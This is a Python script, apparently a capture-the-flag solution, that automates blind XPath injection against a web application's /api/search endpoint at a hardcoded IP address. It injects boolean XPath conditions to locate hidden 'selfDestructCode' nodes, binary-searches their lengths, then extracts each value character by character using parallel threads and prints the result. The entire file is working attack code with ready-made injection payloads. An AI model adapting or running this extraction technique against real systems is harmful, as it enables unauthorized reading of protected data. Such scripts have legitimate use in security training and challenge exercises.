import requests
import threading
import sys
import string
import json
import time

TARGET_URL = 'http://138.68.185.219:30944/'

failure={"failure": 1, "message": "This millitary staff member doesn't exist."}
success={"message": "This millitary staff member exists.", "success": 1}

CURSOR_UP_ONE = '\033[F' 
ERASE_LINE = '\033[K'

def req(pay,debug):
    if(debug):
        #print(pay)
        sys.stdout.write(pay+"\r")
        sys.stdout.flush()
        sys.stdout.write(ERASE_LINE)
        #time.sleep(10)
    a = requests.post(TARGET_URL + '/api/search', json = {
        "search":pay,
    })
    #print(a.text)
    msg=json.loads(a.text)
    return msg==success

def findLoc(max_districts,max_staff):
    codes=list()
    payload="Straorg' and /military/district[position()={district}]/staff[position()={staff}]/selfDestructCode and '1'='1"
    for i in range(1,max_districts+1):
        for j in range(1,max_staff+1):
            sys.stdout.write("District {} Staff {}".format(i,j)+"")
            sys.stdout.flush()
            sys.stdout.write(ERASE_LINE)
            success=req(payload.format(district=i,staff=j),False)
            if(success):
                codes.append([i,j])
                sys.stdout.write(" - Found"+"\r")
                sys.stdout.flush()
                time.sleep(1)
                sys.stdout.write(ERASE_LINE)
            else:
                sys.stdout.write("\r")
                sys.stdout.flush()
                sys.stdout.write(ERASE_LINE)
    return codes

class FlagThread(threading.Thread):
    def __init__(self,threadID,name,loc,n):
        threading.Thread.__init__(self)
        self.name=name
        self.loc=loc
        self.n=n
        self.threadID=threadID
        self.ch=""

    def run(self):
        self.ch=getFlagChar(self.loc,self.n)

def getFlagChar(loc,n):
    charset=string.ascii_lowercase+string.ascii_uppercase+string.digits+"{"+"}"+"_"+string.printable
    payload="Straorg' and substring(/military/district[position()={district}]/staff[position()={staff}]/selfDestructCode,{n},1)='{ch}"

    for ch in charset:
        sys.stdout.write("District {i} Staff {j} - Character {n} - {ch}".format(i=loc[0],j=loc[1],n=n,ch=ch)+"\r")
        sys.stdout.flush()
        sys.stdout.write(ERASE_LINE)

        success=req(payload.format(district=loc[0],staff=loc[1],n=n,ch=ch),False)
        if(success):
            return ch

def getFlagLengths(max,locs):
    lengths=list()
    payload_eq="Straorg' and string-length(/military/district[position()={dis}]/staff[position()={staff}]/selfDestructCode)={n} and '1'='1"
    payload_lt="Straorg' and string-length(/military/district[position()={dis}]/staff[position()={staff}]/selfDestructCode)<{n} and '1'='1"
    #payload_gt="Straorg' and string-length(/military/district[position()={dis}]/staff[position()={staff}]/selfDestructCode)>{n} and '1'='1"
    for loc in locs:
        lower=1
        upper=max
        while(lower<=upper):
            mid=lower+(upper-lower)//2
            sys.stdout.write("District {} Staff {} - Trying {}".format(loc[0],loc[1],mid)+"\r")
            sys.stdout.flush()
            sys.stdout.write(ERASE_LINE)

            if(req(payload_eq.format(dis=loc[0],staff=loc[1],n=mid),False)):
                lengths.append(mid)
                break
            elif(req(payload_lt.format(dis=loc[0],staff=loc[1],n=mid),False)):
                upper=mid-1
            else:
                lower=mid+1
    return lengths

def getFlag():
    locs=findLoc(3,4)
    lengths=getFlagLengths(50,locs)
    n=0
    for i in range(0,len(lengths)):
        n=n+lengths[i]
    threads=list()

    k=0
    for i in range(0,len(lengths)):
        for j in range(0,lengths[i]):
            threads.append(FlagThread(i,"FlagThread_"+str(i),locs[i],j+1))
            threads[k].start()
            k=k+1

    result=""
    for i in range(0,n):
        threads[i].join()
        result=result+threads[i].ch
    return(result)

print(getFlag())